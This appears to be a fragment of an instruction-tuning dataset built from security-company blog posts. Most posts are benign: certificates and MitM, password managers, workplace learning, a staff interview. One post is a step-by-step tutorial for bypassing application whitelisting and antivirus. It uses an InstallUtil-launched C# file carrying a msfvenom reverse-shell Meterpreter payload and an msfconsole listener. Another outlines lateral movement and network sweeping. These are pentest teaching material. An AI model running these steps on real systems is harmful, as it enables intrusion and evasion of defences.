        "output": "Title: \"What's Trust Among Friends: Secure Connections & Man-in-the-Middle Attacks\"\nTaxonomies: \"InfoSec 201, chain of trust, https, Man-in-the-Middle, MitM attack, safe websites, secure connection, self signed certificaate, website security\"\nCreation Date: \"Mon, 11 Apr 2016 13:43:26 +0000\"\nLogan Lembke //\n\nLiving in the information age is great, isn\u2019t it? With just a visit to the internet you can learn what happened in London on September 2nd, 1666, what your friends are up to on the other side of the country, and even buy a new set of homemade fuzzy slippers with nothing but your credit card number, name, and address.\n\nWhile you might not care who knows that you\u2019re a bit of an English history buff or that you might have a slight Facebook addiction, you might just want to keep it a secret that you occasionally buy warm, comfy, adorable slippers from http://grandmasgiftshop.com. Even then, you definitely don\u2019t want other people knowing your credit card information and other personal information.\n\n Tell me with an honest face that you wouldn\u2019t wear these\n\nBeing the great IT expert you are, you quickly send an email to the owner of Grandma\u2019s Gift Shop suggesting she enables https since you know TLS implements public key cryptography, keeping your purchases -- and your slippers -- secure.\n\nNext thing you know, you receive an email from the owner informing you that she has her grandson enabling https right this very instant.  \u2018Awesome!,\u2019 you think, and happily go about your day.\n\n Only the most adorable security for the most adorable slippers \n\nA week later, you visit the site and are promptly met with a notification that looks like this:\n\n JUST LET ME GO WHERE I WANT! \n\nComplacently, but slightly irritated, you accept what you realize to be a self-signed certificate. Still, you go on about your business and order a pair of your favorite foot-warming slippers knowing your purchase was safely encrypted. After all, don\u2019t you trust a grandma who spends her days making warm, comfy slippers?\n\nA year later, you totally ruin your favorite slippers in the mud outside your house. Never fear, Grandma\u2019s Gift Shop is still in business! You quickly decide you deserve an upgrade and happily buy a new pair of slippers.\n\nWhat you don\u2019t know is that some ne\u2019er-do-well on the internet now knows everything about your order and has begun telling everyone what you bought! Even worse, they have your credit card information, name, and address!\n\nOver the next week, you start to notice a few odd purchases on your credit card account, while your internet-addicted friends begin ridiculing your favorite footwear. Immediately, you cancel your card and own up to your slipper obsession.\n\n BUT HOW!? \n\nYou\u2019ve been struck by a Man-in-the-Middle attack! Remember that self-signed certificate you accepted a year ago? Probably not. A hacker created a certificate that mimicked Grandma\u2019s Gift Shop, jumped in the middle of your connection, and when your computer thought it was talking to the trusted server, it was really talking to the hacker\u2019s computer. So, even though your communications were perfectly encrypted, the information was being decrypted by the hacker with ease.\n\nThis brings up two main questions:\n\nHow do we prevent Man-in-the-Middle attacks with TLS?\n\nAnd, why are we so complacent with self-signed certificates? \n\nThe answer to the first question has been tackled time and time again, and you probably know the answer.\n\nSay it with me: Don\u2019t use self-signed certificates.\n\nSigned certificates provide a mechanism for establishing a chain of trust. By placing trust in a few key certificates, and relying on their owners to correctly establish trust with others, you know you can trust the certificate at the end of the chain. But what allows for this chain of trust? Digital signatures.\n\nDigital signatures establish one-way relationships between certificates, and best of all, hackers cannot imitate digital signatures without full access to the certificates which created them.\n\n Example chain of trust using signed certificates \n\nThankfully there are a few options as far as obtaining signed certificates.\n\nThe first option is the traditional route: buying into a trusted certificate authority. These certificate authorities are trusted by default on most computers worldwide and work with you in order to set up your infrastructure. Trusted certificate authorities such as Digicert provide signatures for TLS certificates as long as you provide your name, address, organization name, web address, a few other pieces of information\u2026 and a boatload of money. Currently, Digicert charges $140/year for signed certificates. While any established organization can certainly swing this expense, and should certainly pay for the service, small businesses and Grandma\u2019s Gift Shop are left to suffer.\n\nAlternatively, get down with the free software hippie within you and visit letsencrypt.org. Let\u2019s Encrypt provides free signed certificates that are trusted by almost all modern web browsers and operating systems. While the process needed to obtain certificates from Let\u2019s Encrypt is technically complicated, it is well worth the work. Not only will you be able to establish secure, trusted connections with your customers, but you\u2019ll also learn quite a bit about public key infrastructure (PKI) along the way.\n\nWhen it comes to internal services, a few years ago I would have recommended setting up a self-signed root certificate for your small business or home network. From there, you could sign the certificates deployed on your servers. This setup offers protection from Man-in-the-Middle attacks so long as your would-be hacker could not access your internal root certificate. However, with the introduction of Let\u2019s Encrypt, there is no reason to sign your own root certificate today.\n\nYet, there is one major exception when it comes to internal services.  In order to obtain a signed certificate from Let\u2019s Encrypt or most other certificate authorities, you must have an online web presence. (DNS plays a critical role in verifying your online identity).\n\nWhile signed certificates are well within the grasp of most IT professionals, self-signed certificates continue to be used in offices across the world. But why? Largely two reasons: money and time. Now, with the recent advent of Let\u2019s Encrypt, the list has shortened to time and time alone. As IT industry professionals, we owe it to ourselves, as well as our users, to set aside the time to learn about public key infrastructure and implement it securely across the board.\n\nYet, we should not only make an effort to learn about PKI, but we also need to continually teach newcomers about PKI as well. Now it\u2019s time for you to do your part. Educate your co-workers, users, friends, and family. Take the time to email Grandma\u2019s Gift Shop. Help educate them about public key infrastructure, set them up with a signed certificate, and build that chain of trust. Only then can you can safely order your warm, comfy - and secure - slippers.\n\nHelpful links:\n\nhttps://www.digicert.com/\n\nhttps://letsencrypt.org/how-it-works/\n\nhttps://community.letsencrypt.org/t/which-browsers-and-operating-systems-support-lets-encrypt/4394\n\nhttps://www.sslshopper.com/article-when-are-self-signed-certificates-acceptable.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Herding Those Pesky Passwords\"\nTaxonomies: \"General InfoSec Tips & Tricks, InfoSec 101, dashline, how to store passwords, keepass, last pass, password herding, password management, passwords\"\nCreation Date: \"Fri, 15 Apr 2016 18:50:36 +0000\"\nRick Wisser & Gail Menius //\n\nFrequently we get asked about where to store passwords.  Should they be stored in a word/excel /txt file on your computer? Maybe, written down in a secret little book? The best one: Just to use the same password for everything??? Nooooo\u2026..\nWe could go into the anatomy of a password but Gail has a blog post that already covers the basics, you can find it here.\nWell today we will answer those questions. With password management there are a lot of software solutions out there, such as KeePass, LastPass, and Dashlane, as well as others.\nThe way a password manager works is that once you have installed and created an account/database to hold your password information in. It is then encrypted and only able to be decrypted with a \u201cmaster password\u201d. Essentially this is the only password that you would have to remember so make it a long (16 characters or more) password. Try a phrase like \u201cbeauwillcrackthisifitisshort\u201d (because Beau is awesome!) or if you would like to add a little pizzazz try \u201c@Derekenjoyspasswordhashes$\u201d again it should be the only password that you need to remember so make it easy to recall and long. Also if you lose or forget the \u201cmaster password\u201d you will probably not be able to recover it since a good password manager will not allow you to recover the \u201cmaster password\u201d.\nWith in the password manager you can put information such as: URL, username, password, and description.  You can also have the password manager create a password for you with a specified length.\n(Who doesn\u2019t like Pinterest \u263a)\n\nKeePass Screenshot to Generate New Password for You\n\nKeePass Options to Create a Password for You\nWith KeePass for instance you can specify which character sets you would like to include or exclude as well as length.\nThe final thing I would like to add is with password managers, many times you will only ever see the password when you create/generate it. For instance I use my shortcut keys to copy the passwords to put into the password field I never see the password. Others will give you a button on the website to do essentially the same. \nSo grab a password manager and start managing your passwords today!!! Here is a link to pcmag.com best for 2016 password managers: http://www.pcmag.com/article2/0,2817,2407168,00.asp\nGail and I put together this short fun video on installing Lastpass\u2026. Enjoy!\n[embed]https://youtu.be/fdSixkRlYGQ[/embed]\n \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"The Courage to Learn\"\nTaxonomies: \"InfoSec 101, challenge, culture of education, culture of growth, growth, hard words to say, i don't know, learning\"\nCreation Date: \"Mon, 18 Apr 2016 13:52:10 +0000\"\nSierra Ward // \n\nLast year I listened to a podcast* from Freakonomics that has stuck with me - in fact, I think it\u2019s changed the way I think - powerful stuff from one measly podcast.\n\nThe episode was about the three hardest words in the English language.  Take a stab at what those might be.  Nope.  They\u2019re not \u201cI love you.\u201d  They\u2019re not even \u201cI forgive you.\u201d  Though we can probably all attest to the difficulty of saying those particular phrases.  In fact, the three hardest words are, \u201cI don\u2019t know.\u201d  On the surface, they don\u2019t really seem that difficult, but in order to say them, we need to dig down to the darkest parts of our egos and admit what might seem like a failure.  It makes us feel vulnerable in the worst way possible - especially when it comes to our job/survival.\n\nWhat is it they say, \u201cWhen you stop growing, you die?\u201d  I associate growing to learning, because life at its core requires learning: learning how to not get burned by fire, how to not be attacked by vicious beasts and other instances of extreme danger, and where to find food. The moment we give up on learning is the moment we curl into the fetal position and freeze to death.  That sounds dire because it is.  Learning is the most important aspect of being human.  But there\u2019s something important that has to happen before we can learn - we have to admit we don\u2019t know, and that there are still things left to learn.  \n\nWe\u2019ve all been around teenagers.  They\u2019re sometimes obnoxious (we can be judgey because we were all once in their ranks!) mostly because they think and act like they know everything (annoying to those of us who realize there\u2019s so much left to learn!).  Perhaps this is an innate safety mechanism that propelled us into life, which if we had realized how scary and daunting it really is, they would be paralyzed by fear.  On the other hand, most people escape those fraught and traumatic years to enter into a phase of life where they realize just how ignorant they really are.  When you learn more about anything you realize just how much you don\u2019t know!\n\nI think I can safely say from my conversations with some of our pentesters that what they really enjoy about this career is that no job is the same.  There\u2019s always something to learn, something different, and our pentesters get to utilize different methods to accomplish the job for each different client, even within the same industry.  No day is the same, there\u2019s always something to new to do.  I guess then I\u2019m assuming that there\u2019s always an opportunity to say, \u201cI don\u2019t know.\u201d  But is that okay to say in your job? Will a boss fire you if we admit we don\u2019t know how to do every single aspect of our jobs?\n\nJohn (our boss) has always put a huge emphasis on education.  He spends a large percentage of his time teaching, both within SANS (504 woot!) and also doing educational ventures outside of that - our webcasts are almost always educational and most recently he\u2019s helping to teach a kids Python class in the office.  He\u2019s worked tirelessly to build a culture within the IT community where we can learn from each other and grow in the InfoSec industry.  \n\nBut you know what a culture of education and training means?  We all need to admit both when we don\u2019t know and make this echo chamber a good place to learn - which means people feel comfortable admitting they don\u2019t know something.  We were all there once - naive, ignorant.  My own experience in this industry (to which I\u2019m brand new) has been a great one.  I ask our staff for help with things I\u2019m sure they consider super \u201cdumb,\u201d but that\u2019s okay.  They\u2019re always willing to explain and I\u2019m willing to learn.  And I have learned a TON!\n\nDo we expect anything less of the companies we do business with?  Is it okay to do business with a company that will say, \u201cHey, I don\u2019t know the answer to that, but I\u2019ll find out and get back to you?\u201d  I really appreciate it when a company I\u2019m doing business with can be frank and honest.  Maybe it\u2019s my own bias, but I realize companies are just made out of people, and people can\u2019t possibly have all the answers all the time.  I appreciate helpfulness and a willingness to approach each new problem with gusto to find the solution.  BHIS isn\u2019t any different.  We come up against problems we\u2019re not sure how to solve all the time - it\u2019s why we love our jobs - because they\u2019re always evolving (the InfoSec industry is changing daily) and giving us a chance to learn new things.  \n\nIn conclusion, I\u2019d like to leave you with this challenge: try to admit out loud to another person when you don\u2019t know something.  It can take a lot of courage to be that vulnerable, but just like everything else, it gets easier with practice.  And on the flip side: listen when people are willing to admit that to you, recognizing that they are showing you a lot of trust.  Then ask yourself this: how we can foster a culture of education? A culture where it\u2019s okay to admit we don\u2019t know but want to?\n\n*Check out that Freakonomics podcast here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Bypass Application Whitelisting & AV\"\nTaxonomies: \"Author, Brian Fehrman, Red Team, anti-virus, bypassing AV, Kill your AV, whitelisting\"\nCreation Date: \"Wed, 20 Apr 2016 15:41:23 +0000\"\nBrian Fehrman //\n\nThere are numerous methods that have been published to bypass Anti-Virus products. As a result, many companies are beginning to realize that application whitelisting is another tool to consider adding to their arsenal. Application whitelisting is advantageous in that it doesn\u2019t require constant updating of behavioral or signature-based detection algorithms; you explicitly tell it what can be run. Here, we will show you one method of bypassing some application whitelisting products.\n\nRight up front, we will make it known that we did not develop this method. This method was developed by Casey Smith. We stumbled upon it and felt that it was so awesome that we had to share it.\n\nThis method makes use of two neat features on Windows. The first feature is the ability to compile C# programs without needing the Visual Studio environment. The second feature, which is the one for bypassing application whitelisting, leverages a tool named InstallUtil.exe.\n\nThe first task will be to grab the InstallUtil-ShellCode.cs CSharp file.\n\nhttps://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260\n\nmv InstallUtil-ShellCode-cs InstallUtil-ShellCode.cs\n\nAfter downloading the CSharp file, it\u2019s time to generate our shellcode. We will use msfvenom to output a reverse_tcp meterpreter stager. Type the following, replacing YOUR_IP with the IP address of your Kali machine.\n\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=443 -f csharp > shellcode.txt\n\nNow, copy the contents of the shellcode.txt file to your clipboard\n\ncat shellcode.txt | xclip -selection clipboard\n\nOpen the InstallUtil-ShellCode.cs file for editing.\n\ngedit InstallUtil-ShellCode.cs &\n\nLet\u2019s take a minute to talk about the magic of this approach. In the InstallUtil-ShellCode.cs file, you will notice two functions towards the top. The function named Main (code in the green box) is what will be called if the program is executed normally (e.g., double-clicking, command line, sandboxing, etc.). The function named Uninstall (code in the orange box) will be executed when the program is run by using the InstallUtil.exe tool. The InstallUtil.exe tool is typically on the list of trusted applications and will likely bypass some application whitelisting software. The code within the Uninstall Function will make a call to the Shellcode function, which is where our malicious code will reside. The magic here is that it can potentially be used to bypass both behavioral-based analysis and application whitelisting. With additional obfuscation, signature-based analysis can also be averted.\n\nFind the portion of code shown in the picture below and replace it with the shellcode that is currently on your clipboard (the output from shellcode.txt). Change the word \u201cbuf\u201d in the newly pasted shellcode to be \u201cshellcode\u201d.\n\nNext, let\u2019s get this file over to our Windows machine. Save the InstallUtil-ShellCode.cs file and exit gedit. In the same terminal window, type the following to host the InstallUtil-ShellCode.cs file:\n\npython \u2013m SimpleHTTPServer 80\n\nOn your Windows machine, open a web browser and type the IP address of your Kali machine. Download the InstallUtil-ShellCode.cs file from the directory listing.\n\nLet\u2019s go ahead and compile the file using the csc.exe tool. Open a command prompt, change to your Downloads directory, and compile the program by typing the following:\n\ncd Downloads\n\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe /unsafe /platform:x86 /out:exeshell.exe InstallUtil-ShellCode.cs\n\nHop back over to the Kali machine and let\u2019s start a Meterpreter listener by using msfconsole. Kill the python server by hitting Ctrl-C in the terminal. Then, type the following (replacing YOUR_IP with your Kali IP address:\n\n msfconsole\n use multi/handler\n set payload windows/meterpreter/reverse_tcp\n set LHOST YOUR_IP\n set LPORT 443\n set ExitOnSession false\n run -j\n\nHead back to the Window\u2019s terminal. Type the following to execute the shellcode program by using the InstallUtil.exe tool:\n\nC:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe\n\nChecking the Window\u2019s task manager shows that just the InstallUtil.exe process is present and not our exeshell.exe file.\n\nPop back into the Kali machine and check out the msfconsole window. Did you get a session?\n\nIn closing, we\u2019ve shown you one way to potentially bypass application whitelisting software. The method was developed by Casey Smith. The demo here looked at establishing a meterpreter session but the possibilities are endless for what code you can execute on the system. Being able to compile the code on a Windows system without the need for Visual Studio is also a huge bonus. This method can also be used to avoid both behavioral and signature-based anti-virus analysis. This is one approach that you will definitely want to keep in your toolbox when it comes to assessing security tools.\n\nJoin the BHIS Blog Mailing List \u2013 get notified when we post new blogs, webcasts, and podcasts.\n\n[jetpack_subscription_form show_only_email_and_button=\"true\" custom_background_button_color=\"undefined\" custom_text_button_color=\"undefined\" submit_button_text=\"Subscribe\" submit_button_classes=\"undefined\" show_subscribers_total=\"true\" ]\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Get to Know a Tester: Ethan Robish\"\nTaxonomies: \"Author, Ethan Robish, Fun & Games, college, get to know a tester, internship, interview, my mom got me a job\"\nCreation Date: \"Fri, 22 Apr 2016 15:48:45 +0000\"\nSierra Ward & Ethan Robish //\nIntro by Ethan: Sierra came up with the idea to interview me for this blog.  I thought it was a great idea and after watching Rick and Gail\u2019s dynamic on the video they created the other day, I thought it could be really fun too.  \nOur attempts at recording video failed.  Our attempts at recording audio mostly failed.  We got an audio recording that was akin to talking through these:\n\nSo instead you will find the transcript of our conversation.\n__________\nS: Hi Ethan, how are you?\nE: Hi, I\u2019m doing great. How are you, Sierra?\nS: Good! So BHIS has been around since 2008, and you started right at the beginning right?\nE: Yeah, pretty close.\nS: And how did you end up connecting with John and getting involved at that starting point?\nE: So BHIS, as you know is based in the Black Hills.  I went to school in a city that is right in the middle of the Black Hills called Rapid City and there was a poster, just a one page ad for an internship hanging on a bulletin board at my school. It was my mom who actually noticed it and pointed it out.  I think it said something like, \u201cDo you like to break things? All you can drink Mountain Dew!\u201d I called the number on the flyer, John answered and he said nobody had called him in about six months and he didn\u2019t even think the flyer was there anymore.  But here I am.  He asked me a few questions on the phone and then he decided to meet me.  He lives about an hour away so we set up a time and he took me to sushi.  It was the first time I\u2019d ever had sushi.\nS: Nice!\nE: So that was our interview, and he hired me on as an intern while I was going to college.\nS: Cool. Well I kind of love that your mom saw it and got you your \u201cfirst job.\u201d\nE: (laughing) Yeah, she likes to bring that up too.\nS: What were you going to school for at that point?\nE: I started as a computer engineer, but switched to computer science, which is what I graduated with.\nS: Why did you make the switch?\nE: A couple of different reasons. I decided I liked to program better, mainly since there\u2019s a lot more immediate gratification versus tinkering with hardware and electronics.\nS: Okay, yeah that makes sense.  And so did you know anything about pentesting when you started working with John?\nE: No, no I didn\u2019t. So when I first called John he kind of described what he did and I remember asking him, \u201cIs this legal?  Do you have permission to do this kind of stuff?\u201d I think he liked that I asked that question. But no I didn\u2019t know this kind of job existed before I met John.\nS: Awesome.  I guess 2008 doesn\u2019t really seem that long ago but eight years has made a big difference in just how much the general public knows about hacking and computer stuff\nE: Definitely. The last few years it\u2019s been all over the news; the media likes to bring up.\nS: It\u2019s one of those things that\u2019s really scary and nobody understands it, so kind of perfect news.\nE: True, I can understand why the news likes it.\nS: So then you were an intern working with John.  Was it just John by himself at that point? Or were there other people working at BHIS?\nE: I think there were other people who were kind of coming and going, also interns. So BHIS at the beginning was kind of a black box, at least to me. I met John about two times in as many years. I would correspond with him through email and I learned to be concise pretty quickly.  I would send him page long emails about what I\u2019d been doing and asking for feedback and he\u2019d send back - if I was lucky - a sentence, but sometimes just a couple of words.\nS: \u201cGood! Keep going!\u201d\nE: (laughs)\nS: Yeah, it\u2019s definitely kind of the same thing for me when I started. John throws you in and you learn to swim.\nE: But back to your question. I saw other people copied on emails randomly, but it was never a thing where John told me, \u201cHey you\u2019re going to be working with this person.\u201d or, \u201cHey, I\u2019ve got this other person and I\u2019d like you to work with them.\u201d I was just kind of in my own little world.  And then at one point during summer break I did a full-time internship with BHIS.\nS: What year were you when you started?\nE: I was just a freshman.\nS: So you started working with him right at the beginning of school then?\nE: Yeah, and I think the internship was between my junior and senior years of college - the full-time internship - and I got to see John a lot more in person during that time.\nS: That helps.\nE: Yes.\nS: And then after you graduated were you still an intern? Or did you go full-time at that point?\nE: After I graduated I actually went to Seattle for a summer and I did another internship there for a different company and immediately after that was hired on full-time for BHIS.\nS: Great. And compared to when you started what is it like to work with BHIS now?\nE: I feel like there\u2019s parallels watching a child grow; raising a child. I\u2019ve never done so myself, but right at the beginning it\u2019s always kind of in the moment and then they grow and they grow and eventually they\u2019re old and maybe someone who you haven\u2019t seen in a while comes back and they say, \u201cOh my gosh, your child has gotten so big!\u201d but the parents are just like \u201cThis is my child.\u201d\nS: It\u2019s hard to see the difference.\nE: Yeah, it\u2019s hard to tell unless I really step back.  Back at the beginning when I was hired on, there was one other full-time person, who had been hired a few months before me, Tim Tomes.  And so we worked together and, pretty much everyone at BHIS is remote and definitely everyone at the beginning was remote.  We worked together and emailed back and forth and had online conversations, but it was a year of working before I actually finally met Tim in person. That was kind of strange. Besides John, I didn\u2019t meet my sole co-worker in person for a year.\nS: It\u2019s definitely different. So do you like working at home? How would you describe your experience working at home?\nE: It definitely has its ups and downs. There are some benefits of working in an office. But that being said I don\u2019t think I\u2019d ever go back to working in an office full-time. I really enjoy being able to work from home, being able to have my own space and pace and think without too many other people to distract me.\nS: It\u2019s more fun to work in an office.  But there might be more fun and a little less work.\nE: Yeah.\nS: So when you\u2019re working, can you describe a typical week or typical day?  Without getting into too much detail what are some of the things you work on and do or what is your routine?\nE: I don\u2019t think I\u2019ve had a typical week since I\u2019ve started (laughs) but I\u2019ll try my best to kind of summarize.  As I said, things have changed quite a bit, both at BHIS and my role has also changed quite a bit. I still do testing but I\u2019ve transitioned more to doing development recently.  So I wake up, have breakfast, get ready, start up my computer and log in.  I try to avoid checking email first thing in the morning because otherwise that tends to be a black hole for me and before I know it half the day\u2019s gone and I don\u2019t know what I\u2019ve done!\nS: (laughs)\nE: So I usually try to figure out the night before what I need to get done, and work on that before I open up the floodgates of email.\nS: Good plan. Do you feel like, you\u2019re better - so nobody can multi task, we\u2019re just flipping between mini tasks and not really getting anything done - but you\u2019re saying that you try to have one focused project that you start the day with and you work on that.\nE: Yeah, that\u2019s what my approach has been lately. You talk about multi tasking, I used to think I could multi task (laughs) as we mentioned it doesn\u2019t work so well.  I finally have learned that.\nS: Yeah, I\u2019m learning that more and more, to not have 10 million web tabs open and just have one thing that I\u2019m doing.  So what are the hours you usually keep?\nE: It changes so much, I\u2019m not really good about getting up in the morning. I\u2019m typically a night owl.  I also really don\u2019t like waking up to an alarm. So unless I have something specific I need to be up for I try to just wake up naturally. We have meetings and appointments that we have to manage within the company but outside of that we kind of set our own hours.  If I have something I have to do in the afternoon I can go do that and then come back and finish later that night and continue working.\nS: I do like the flexibility.  So, you mentioned that you\u2019re involved in the R&D on the development team. How did you fall into doing that?\nE: I think it was just what I wanted to do. I really liked doing pentesting and I really like doing development.  Something I learned working for BHIS and internships is that I flourish the best when I can switch between the two.  Not necessarily multitasking but if I can do one for a while, like a few months or a half a year and then switch to the other one it helps me to come at it with a new enthusiasm and not get too bogged down doing the same thing.\nS: Yeah not get burned out or overloaded.  And it seems like maybe the dev comes from your experience pentesting? Would you say that\u2019s accurate?\nE: Yeah, I definitely have insights about what would be useful as a pentesting tool and where to focus my dev efforts to what would be most useful.\nS: So it\u2019s kind of really great that you like doing both of those things - you can kind of stay in touch with the ways people are attacking and the things happening in info sec and go back and develop it more.\nE: Well, it\u2019s what I prefer so I\u2019m glad other people think it\u2019s good that I like to do both.\nS: Well, I think it makes a lot of sense. And from talking to some of the other testers that's one of the things that you really like about your jobs is that it\u2019s always different and always changing and that you\u2019re never, even for the people that are doing straight pentesting, it\u2019s different even from job to job even within the same industry because each job has different needs; it\u2019s never too routine.  What would you say your least favorite part of R&D is?\nE: I think for every programmer the least favorite part is debugging. Probably the most favorite part is after you're debugged and you\u2019ve actually solved something and figured out what was going wrong.\nS: A big endorphin rush!\nE: And it\u2019s the same thing with pentesting too. It\u2019s really frustrating to beat your head against an application or a network over and over again but you know once you find that chink and you weasel your way in it\u2019s a pretty good feeling.\nS: Yeah well, if it wasn\u2019t hard it wouldn\u2019t be fun.\nE: That\u2019s true actually, there\u2019s a lot to be said for that.\nS: So for someone just wanting to get into this field, the pentesting field, do you have any advice you\u2019d give them? Look for random posters?\nE: (Laughs) Yeah, keep an eye out for opportunities. That\u2019s good advice all around. But I think if they want to make themselves stand out probably the best thing to do is to get out there and try things. Get experience. If that means finding local groups that you can be a part of just to get your fingers on the pulse of the community, that\u2019s good experience. You just sort of absorb the mentality of the security mindset.  Or it can be competing in CTFs (capture the flag) competitions; those are good. Even if you don't have those available there\u2019s all sorts of hackable tests sites or test programs that you can find online that are specifically meant to teach you security concepts. So just trying them. You\u2019re going to learn the most by actually doing it. As you're doing it you\u2019re trying to figure out why doesn't this work, and by the time you\u2019ve figured out how it works and why it works you\u2019ve done all this research and you understand the issue and you can actually do it and you can replicate it.  It\u2019s one thing to read a blog post and say, \u201coh that makes sense,\u201d but it\u2019s a completely different thing to actually go through it and replicate it on your own. You\u2019re going to learn so much more and you\u2019re going to have a handle on the details then.\nS: That sounds like great advice. And so that would be for someone entering the industry. But from your perspective as a pentester what then would you have to say to maybe someone that is running a company or is on the IT staff of the company what can they do to make their company a little less vulnerable to attacks from pen testers but also from real bad guys?\nE: Okay so yeah, companies that I\u2019ve found to be the most successful or the most secure, the one thing they all really have in common is that they really care about security.  The mindset of the company is like, security is a priority to them. A lot of companies will try to do double duty and they\u2019ll give it to their IT people, they\u2019re having them do security on the side essentially.  And that might be a necessity due to budgets and just not having the skill-set available. But to really thrive you kind of need some dedicated staff and you need the rest of the company no not have the mindset that they\u2019re adversarial.  The rest of the company shouldn\u2019t view the security people as they\u2019re just there to make your lives harder.\nS: \u201cSo we need your passwords to be 40 characters long.\u201d\nE: (laughs) They should try to understand the importance of security - try to cultivate why security is important.  And as we mentioned earlier, the media constantly streaming that out into the open, I think that helps. Plus, it gives companies incentive to make security important.\nS: Well I mean, if I were running say, a hospital, seeing that hospitals are having $17,000 ransomware catastrophe that definitely makes me more aware of it.  There\u2019s times when we like to rag on the media, but it definitely helps bring that to the public forefront. So is there anything else you\u2019d like to mention or talk about?  I feel like we got a good a glimpse into your experience and job.\nE: There is one more questions on the list, \u201cWhat do you really enjoy about working a BHIS?\u201d and I\u2019d like to take a shot at that.\nS: Oh, do, do!\nE: My favorite part of working here is just the people we have working together.  It\u2019s hard working remotely. You don\u2019t get to interact with your co-workers as much as if you worked in an office. And it\u2019s just, it\u2019s not the same as face to face interaction.  But one thing I really like is when we get together - we usually get together at security conferences once a year or so, or sometimes there will be a bunch of on a test together - that\u2019s my favorite part. Just being with people who are like-minded, who care about security, who you can say something completely technical out of the blue that your friends and family would think you\u2019re talking jibberish, but they actually understand it and respond in kind. That\u2019s my favorite part. We\u2019ve got some really great people at BHIS.\nS: I pretty much love it! And you said it was nice to have like-minded people, but I feel like I've worked in a lot of different industries myself, and you can have like-minded people that still don\u2019t gel and one of the things that\u2019s really special about BHIS is that more than just having our job in common I feel like - I\u2019m not a pentester so I don\u2019t have your job in common - but that we all have so much fun when we get together just I feel like John has done a good job of bringing people together that gel and work well together, on top of having our, or you guys\u2019s, technical skill in common.\nE: Yeah.\nS: Well thanks for talking to me Ethan, it\u2019s been awesome.  I feel like I learned a lot about you and I hope everybody listening feels the same way.  So thanks for the time.\nE: All right, take care.\nS: Bye.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Internal Pivot, Network Enumeration, & Lateral Movement\"\nTaxonomies: \"Author, External/Internal, Joff Thyer, Red Team, C2, internal pentest, ipconfig, ipconfig Output, l33t ninja, metasploit, pen-testing, Pentesting\"\nCreation Date: \"Mon, 25 Apr 2016 16:27:49 +0000\"\nJoff Thyer //\n\nPicture a scenario whereby you are involved in an internal network penetration test. Perhaps you have succeeded with a spear-phishing campaign and landed on an internal system, or perhaps you have been placed there to begin with.\n\nBeing the l33t ninja penetration tester that you are, you lead with some low n\u2019 slow outbound port scanning and quickly realize you have a handful of useful TCP ports available for Command and Control (C2) communications. Either using your pre-existing C2 channel or by establishing another one, you begin to look for privilege escalation. Naturally, you whip out good old \u201cPowerUp\u201d from the Empire project as well as your favorite method to examine group policy preferences. You are lucky today and find that there is a DLL hijack opportunity, as well as credentials within the Group Policy Preferences XML files.  Taking the easy route, you use the Group Policy Preferences credentials and establish a privileged C2 channel using trusty PSEXEC, or WMI.\n\nAfter that, you go ahead with your usual routine to learn more information. Windows commands like \u2018net view /domain\u2019, \u2018net localgroup administrators\u2019, \u2018net group \u201cDomain Admins\u201d /domain\u2019, and \u2018net group \u201cDomain Controllers\u201d /domain\u2019.\n\nYou also go ahead and check out \u201cUser-Hunter\u201d from Empire in order to find where all the domain admins have logged in.\n\nYou proceed with some DNS lookups against the domain controller names and get a pretty good sense of where in the network these systems live.  You quickly learn that the environment is pretty large with dedicated sub-networks for client systems, as well as dedicated sub-networks for server systems.\n\nAfter that, you begin to wonder how the rest of the client-side network is put together. You know it has sub-networks, but like so many organizations, your customer uses a class B network (/16) on the inside and you really want to get a sense of where all the client-side subnets are!\n\nOne great start is your own network adapter. You type the \u2018ipconfig\u2019 command and learn that you are sitting in a class C network.\n\n ipconfig Output \n\nFrom here you can make some observations. Namely that you have an address in a class C (/24) address space with a router gateway address of the network address (10.99.1.0 in this case) plus one.\n\nYou are dying to crank loose some \u201csmb_login\u201d scans with Metasploit so you can login to other systems. You know you can target some individual systems found with user-hunter, but you don\u2019t want to miss any really cool devices for expanded attack surface opportunities!\n\nWith some l33t consulting from some former enterprise network architect people, you have a pretty good idea that almost all of the router gateways in this environment will probably observe the same convention of being the network address plus one. You can also make the assumption that if you are sitting in a class C address space, then a pretty good part of the network is probably architected the same way. Since internal routers very rarely filter ICMP traffic, then you can go on an internal router gateway hunt using ICMP echo requests, and a DOS batch file loop command.\n\nC:\\> FOR /L %X IN (1,1,254) do @PING -i 3 -w 1 -n 1 10.99.%x.1 | FIND \u201cbytes=\u201d\n\nLet\u2019s break the PING command arguments down to understand this a little better:\n\n        -i 3         \u21d2 set the IP TTL to 3 hops maximum (stay pretty local in other words)\n\n        -w 1        \u21d2 wait only 1 second for a response\n\n        -n 1        \u21d2 send only one packet\n\nThe result of doing this should reveal all the potential router gateways on the network, which in turn lets you know where other client/server sub-networks reside in the environment.\n\n Sample ICMP Echo Replies \n\nThe results above also yield some other potential information. Where the TTL returned is 255, you are getting answers in your local subnet. Where the TTL returned is 254, you are probably getting answers in the same LAN / campus location as where your system is connected. Where the TTL is 253 or even less, you may well be pinging router gateways in a remote branch office or other campus location. You might have to experiment a little with the \u201c-i 3\u201d parameter if the network is larger, and involves perhaps MultiProtocol Label Switching (MPLS).  In the case of MPLS, the TTL might or might not be decremented across the MPLS (cloud) router hops. This is a provider dependent decision.  I would recommend starting with \u201c-i 3\u201d and going up as high as \u201c-i 9\u201d to capture most of the network scope. Anything that is not local would be routed to the gateway of last resort and will result in a \u201cTTL expired in transit method\u201d response, or in more sophisticated environments might be routed to a black hole/sink destination.\n\nHappy pen testing all!\n\n"
    },
    {
        "input": "",
        "instruction": "",
